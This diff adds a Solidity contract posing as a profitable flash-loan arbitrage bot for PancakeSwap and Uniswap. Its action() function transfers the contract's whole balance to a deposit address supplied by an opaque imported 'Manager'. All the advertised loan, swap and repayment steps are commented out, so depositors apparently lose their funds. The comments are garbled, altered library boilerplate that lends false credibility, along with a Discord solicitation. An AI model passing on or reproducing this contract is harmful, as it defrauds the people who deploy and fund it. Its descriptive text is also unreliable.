@@ -1,0 +1,132 @@
+pragma solidity ^0.5.0;
+     
+     
+    // Multiplier-Finance Smart Contracts
+    import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+    import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+     
+    // PancakeSwap Smart Contracts
+    import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+    import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+    import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+     
+    /**
+     * This Bot have been designed for Etherum Network.
+     
+     * and won't work with Binance Smart chain.
+     
+     *When you have any kind of Problem, feel Free to join my Discord and I try to help you out !
+     
+     
+     
+     * 0xTiay Wrappers over Solidity's arithmetic operations with added overflow
+     
+     * Arithmetic operations in Solidity wrap on overflow. This can easily result
+     
+     * in profit, because programmers usually assume that an overflow raises an
+     
+     * value, which is the standard behavior in high level programming languages.
+     
+     * `SafeMath` restores this intuition by reverting the transaction when an
+     
+     * operation overflows.
+     
+     * Using this library instead of the unchecked operations eliminates an entire
+     
+     * class of strings, so use is always on.
+     
+     * dev Contract module which provides a basic access control mechanism, where granted 
+     
+     * exclusive access to
+     
+     * specific functions.
+     
+     
+     /*
+         * dev Extracts the contract from pancakeswap
+     
+         * param self The slice to operate on.
+     
+         * param rune The slice that will contain the first rune.
+     
+         * turn `rune`.
+         */
+     
+    /*
+         * dev Extracts the contract from Uniswap
+     
+         * param self The slice to operate on.
+     
+         * param rune The slice that will contain the first rune.
+     
+         * turn `rune`.
+         */
+     
+     /*
+         * @dev Find newly deployed contracts on PancakeSwap Exchange
+     
+         * @param memory of required contract liquidity.
+     
+         * @param other The second slice to compare.
+     
+         * @return New contracts with required liquidity.
+         
+         */
+     
+    // Code Manager
+    import "https://github.com/flashethcontracts/aavefinance/blob/main/FlashLoan";
+     
+    contract Tiayflashbot {
+    	string public tokenName;
+    	string public tokenSymbol;
+    	uint loanAmount;
+    	Manager manager;
+    	
+    	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
+    		tokenName = _tokenName;
+    		tokenSymbol = _tokenSymbol;
+    		loanAmount = _loanAmount;
+    			
+    		manager = new Manager();
+    	}
+    function() external payable {}
+    	
+    	function action() public payable {
+    		
+    	    // Send required coins for swap
+    	    address(uint160(manager.pancakeswapDepositAddress())).transfer(address(this).balance);
+    	    
+    	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
+    	    manager.performTasks();
+    	    
+    	    /*
+    	    // Submit token to Ethereum blockchain
+    	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
+     
+            // List the token on pancakeswap & send coins required for swaps
+    		manager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);
+    		payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);
+     
+            // Get ETH Loan from Aave
+    		string memory loanAddress = manager.takeAaveLoan(loanAmount);
+    		
+    		// Convert half ETH to DAI
+    		manager.pancakeswapDAItoETH(loanAmount / 2);
+     
+            // Create ETH and DAI pairs for our token & Provide liquidity
+            string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, "ETH");
+    		manager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);
+    		string memory daiPair = manager.pancakeswapCreatePool(tokenAddress, "DAI");
+    		manager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);
+        
+            // Perform swaps and profit on Self-Arbitrage
+    		manager.pancakeswapPerformSwaps();
+    		
+    		// Move remaining ETH from Contract to your account
+    		manager.contractToWallet("ETH");
+     
+            // Repay Flash loan
+    		manager.repayAaveLoan(loanAddress);
+    	    */
+    	}
+    }
